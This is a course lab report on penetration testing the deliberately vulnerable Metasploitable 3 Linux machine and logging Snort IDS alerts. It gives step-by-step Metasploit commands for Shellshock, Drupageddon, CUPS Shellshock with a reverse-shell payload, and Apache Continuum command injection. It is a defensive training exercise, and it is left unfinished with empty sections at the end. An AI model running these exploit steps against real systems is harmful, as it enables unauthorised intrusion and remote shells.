# Penetration Testing Report on Metasploitable 3 (Linux)

## Introduction

This report details the penetration testing performed on the [Metasploitable 3 (Linux)](https://github.com/rapid7/metasploitable3) operating system using [Metasploit](https://www.metasploit.com/). Five different attacks were carried out, with three being identifiable by the [Snort](https://www.snort.org/) Intrusion Detection System (IDS) and two going undetected. The report provides a brief description of each attack, including the targeted component, execution method, and Snort output for detected attacks. Additionally, it includes an essay on the benefits and shortcomings of using intrusion detection systems.



## IDENTIFIED ATTACK 1: Apache HTTP Server RCE

### Description

**Component Targeted:** Shellshock Bash Vulnerability / Apache web server with CGI scripts

**Execution Method:** This attack exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. It targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition. [CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)

**Steps in Metasploit:**
1. Select the exploit: `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
2. Set the target IP: `set RHOST <target_ip>`
3. Set the target URI: `set TARGETURI /cgi-bin/hello_world.sh`
4. Execute the attack: `run`

**Snort Output:**
```
[**] [1:2025869:2] ET WEB_SPECIFIC_APPS ELF file magic plain Inbound Web Servers Likely Command Execution 12 [**] [Classification: Attempted User Privilege Gain]          [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80      
[**] [1:1336:5] WEB-ATTACKS chmod command attempt [**]                                                            [Classification: Web Application Attack]                 [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80                                                                            
[**] [1:100000122:1] COMMUNITY WEB-MISC mod_jrun overflow attempt [**]                                            [Classification: Web Application Attack]                 [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80                                                            
[**] [1:2022028:1] ET WEB_SERVER Possible CVE-2014-6271 Attempt [**]                                              [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:56643 -> 172.28.128.3:80 
```



## IDENTIFIED ATTACK 2: Drupal Drupageddon

### Description

**Component Targeted:** Drupal Web Application

**Execution Method:** This attack exploits a remote code execution vulnerability in Drupal (versions 7.0 to 7.31), commonly referred to as "Drupageddon". The vulnerability allows an attacker to execute arbitrary PHP code on the web server by exploiting an SQL injection vulnerability in the Drupal HTTP Parameter Key/Value handling. [CVE-2014-3704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704)

**Steps in Metasploit:**
1. Select the exploit: `use exploit/multi/http/drupal_drupageddon`
2. Set the target IP: `set RHOST <target_ip>`
3. Set the target URI: `set TARGETURI /drupal/`
4. Execute the attack: `run`

**Snort Output:**
```
[**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:58460 -> 172.28.128.3:80 
```



## IDENTIFIED ATTACK 3: CUPS Filter Bash Environment Variable Code Injection (Shellshock)

### Description

**Component Targeted:** CUPS (Common UNIX Printing System)

**Execution Method:** This attack exploits a remote code execution vulnerability in the CUPS printing system by leveraging the Shellshock vulnerability in Bash. The vulnerability allows an attacker to inject and execute arbitrary code via manipulated environment variables passed to the CUPS filters.

**Preparation:** Before performing the attack, ensure the `vagrant` user is added to the `lpadmin` group on the Metasploitable box, as the exploit requires elevated privileges to execute properly.
```
usermod -a -G lpadmin vagrant
```

**Steps in Metasploit:**
1. Select the exploit: `use exploit/multi/http/cups_bash_env_exec`
2. Set the target IP: `set RHOST <target_ip>`
3. Set the CUPS username: `set HttpUsername vagrant`
4. Set the CUPS password: `set HttpPassword vagrant`
5. Set the payload to use a reverse TCP connection: `set PAYLOAD cmd/unix/reverse_ruby`
6. Configure the local host IP for the payload: `set LHOST  <listen_ip>`
7. Execute the attack: `run`

**Snort Output:**
```
[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58859 -> 172.28.128.3:631                                                                
[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58862 -> 172.28.128.3:631                                                                
[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58864 -> 172.28.128.3:631                                                                
[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58864 -> 172.28.128.3:631 
```



## MISSED ATTACK 1: Apache Continuum Arbitrary Command Execution

### Description

**Component Targeted:** Apache Continuum

**Execution Method:** By injecting a command into the installation.varValue POST parameter to /continuum/saveInstallation.action, a shell can be spawned.

**Steps in Metasploit:**
1. Select the exploit: `use linux/http/apache_continuum_cmd_exec`
2. Set the target IP: `set RHOSTS <target_ip>`
3. Execute the attack: `run`

**Reason for Missing:** Snort missed this attack because `rules/policy-other.rules` was not in use. (as per the [snort.conf](https://cybersecuritybase.mooc.fi/19231e84dafffa079550777b17d8fb3e/snort.conf) provided by the course)
Only thing Snort notice was:
```
[**] [1:620:10] SCAN Proxy Port 8080 attempt [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 172.28.128.1:58585 -> 172.28.128.3:8080
```
which is a port scan notification (same you would get for using `nmap`) and by the instructions of the course __"[...] does *not* count as an attack"__.


## MISSED ATTACK 2:
**description**

## ESSAY: The benefits and shortcomings of using intrusion detection systems
